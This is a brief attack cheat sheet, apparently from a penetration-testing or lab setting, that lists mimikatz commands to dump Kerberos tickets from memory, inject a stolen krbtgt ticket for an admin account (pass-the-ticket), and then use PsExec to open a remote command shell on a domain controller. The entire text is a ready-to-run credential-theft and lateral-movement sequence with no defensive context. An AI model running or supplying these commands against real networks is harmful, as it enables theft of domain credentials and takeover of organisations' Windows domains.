run mimikatz with admin rights
```
privilege::debug
sekurlsa::tickets /export
sekurlsa::tickets /export


# load ticket, ticket must be  name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

# exit mimikatz and execute psexec
C:\Tools\SysinternalsSuite\PsExec.exe -accepteula \\cdc01 cmd
```
